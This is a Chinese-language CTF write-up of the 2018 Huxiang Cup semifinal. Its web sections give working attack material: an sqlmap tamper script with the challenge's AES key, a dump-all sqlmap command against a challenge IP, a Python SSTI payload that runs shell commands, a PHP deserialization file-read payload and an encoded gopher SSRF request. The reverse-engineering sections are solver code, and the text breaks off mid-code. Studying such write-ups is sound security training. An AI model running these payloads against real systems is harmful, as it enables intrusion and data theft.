# 2018湖湘杯复赛-WriteUp
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
> By DWN战队
web这块基本都是原题，仅作参考。
差一题pwn200 AK。
## 签到题 SingIn Welcome
## WEB Code Check
访问是一个登陆页面，查看源码有一个链接。
    news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09
尝试注入，一直返回数据库错误。
然后在news目录下发现源码list.zip
    query($sql);
    // $arr=$info->fetch_assoc();
    // ?>
    // 
    // 
    // 
    // 
    // X公司HR系统V1.0
    // 
    // 
    // 
    // 
    // 
    // 
    // 
    // 
b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09就是1加密过的。
需要逆推一下这个函数。
    function encode($data){
        $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,'');
        mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021');
        $data = $data .'hxb2018';
        $data = mcrypt_generic($td,$data);
        $data=base64_encode(base64_encode($data));
        mcrypt_generic_deinit($td);
        mcrypt_module_close($td);
        // echo substr(trim($data),0,strlen(trim($data))-7)；
        echo $data;
    }
然后将我们的payload直接加密然后注入。
由于比较麻烦，tamper省事一点
hxb.py
    #!/usr/bin/env python
    """
    Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
    See the file 'LICENSE' for copying permission
    """
    import base64
    from Crypto.Cipher import AES
    from lib.core.enums import PRIORITY
    from lib.core.settings import UNICODE_ENCODING
    __priority__ = PRIORITY.LOWEST
    def dependencies():
        pass
    def encrypt(text):
        padding = ''
        key = 'ydhaqPQnexoaDuW3'
        iv = '2018201920202021'
        pad_it = lambda s: s+(16 - len(s)%16)*padding
        cipher = AES.new(key, AES.MODE_CBC, iv)
        text = text + 'hxb2018'
        return base64.b64encode(base64.b64encode(cipher.encrypt(pad_it(text))))
    def tamper(payload, **kwargs):
        return encrypt(payload)
很多人没注意notice2
直接一把嗦：
     sqlmap -u "http://47.107.236.42:49882/news/list.php?id=1" --tamper hxb.py --dump-all -T "notice,notice2,stormgroup_member" -D mozhe_discuz_stormgroup
## WEB XmeO
没啥好说的，基本的SSTI
直接找xss bot源码
    ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat   //home/XmeO/auto.js").read()' )
hh
## WEB MyNote
注册一个账号，发现可以上传。
查看上传的图片
有一个picture的cookie
数组的反序列化读取文件。
robots.txt可以知道存在flag.php
payload：
     $wing[] = '../../flag.php';
    echo urlencode(base64_encode(serialize($wing)));
发送过去，看到了data协议的数据。
解码
## WEB ReadFIle
这题也没什么考点，emmm。
file协议可以读取到文件。
首先发现ssrf目录下的web.php
出题人原意可能是想让我们用gopher打。
但是源码里面有一个这个：/var/www/html/ssrf/readflag
    $ip = $_SERVER['REMOTE_ADDR'];
    if(isset($_POST['user'])){
      if($_POST['user']=="admin" && $ip=="127.0.0.1"){
        system("/var/www/html/ssrf/readflag");
    }
    }
curl 保存到本地。
用ida分析一下
flag在ssrf目录…..
gopher参考：
    %67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%2f%5f%50%4f%53%54%20%2f%73%73%72%66%2f%77%65%62%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%25%30%64%25%30%61%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%36%25%30%64%25%30%61%55%73%65%72%2d%41%67%65%6e%74%3a%20%63%75%72%6c%2f%37%2e%34%33%2e%30%25%30%64%25%30%61%41%63%63%65%70%74%3a%20%2a%2f%2a%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%31%30%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%25%30%64%25%30%61%25%30%64%25%30%61%75%73%65%72%3d%61%64%6d%69%6e
> 这次的re难度不是太大……但是re2和re3都有点偏门，不太硬核233 但也挺有意思的
## Replace
upx -d脱壳，然后是一个比普通签到略复杂一点的签到题，没什么好说的
要求table[input[i]] == atoi(data[2*i]+data[2*i+1])^0x19
    table = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,
      0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,
      0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,
      0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,
      0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,
      0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,
      0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,
      0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
      0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,
      0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,
      0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,
      0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,
      0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,
      0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,
      0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,
      0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
      0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,
      0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,
      0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,
      0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,
      0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,
      0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,
      0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,
      0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
      0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,
      0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]
    s = bytes.fromhex("2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6")
    for i in range(len(s)):
        v = table.index(s[i]^0x19)
        print(chr(v), end='')
## HighwayHash64
从题目和描述的Hash，以及输入提示的
> Note:hxb2018{digits}
就可以猜到，这估计是个爆破Hash的题目
看了一下hash函数中初始化结构体的部分跟md5不同，查了也没有信息，所以可能是自定义的哈希算法
刚开始尝试了一下扒代码到编译器中复现，然而有很多ROL的宏定义，比较麻烦，所以直接调用该函数是比较方便的
调用函数有两种方法，一种是写一个dll注入到exe中进行调用，另一种则是将该exe直接改成dll，另外写一个exe来调用
前者日后再尝试吧，相对而言感觉要复杂一些
后者只需要将exe的PE头中的标志位修改，再通过RVA(Relative Virtual Address)获取函数地址即可
具体方法为，首先通过十六进制编辑器修改PE头
这里使用010Editor一类的工具会比较方便
  * NtHeader 
    * Characteristics 
      * IMAGE_FILE_DLL标志位
将该位改为1即可通过LoadLibrary调用
    typedef __int64(__fastcall *f)(__int64 buff, unsigned __int64 len);
    int main()
    {
        HINSTANCE hdll;
        hdll = LoadLibrary(TEXT("F:\ctf\hxb\2018\reverse.dll"));
        if (hdll == NULL)
        {
            printf("Load dll Error: %dn", GetLastError());
            return 0;
        }
        printf("Dll base is %llxn", hdll);
        func = ((f)((char*)hdll + 0x17A0));